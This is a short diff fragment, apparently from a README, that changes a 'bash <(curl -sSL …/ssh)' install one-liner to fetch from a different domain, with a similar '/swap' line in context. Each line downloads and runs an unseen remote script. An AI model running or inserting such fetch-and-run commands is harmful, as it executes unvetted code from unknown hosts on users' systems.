@@ -68,7 +68,7 @@ bash <(curl -sSL 19510272.xyz/swap)
 
 ```sh
 
-bash <(curl -sSL 19510272.xyz/ssh)
+bash <(curl -sSL sink-4rn.pages.dev/ssh)
 ```
 
 
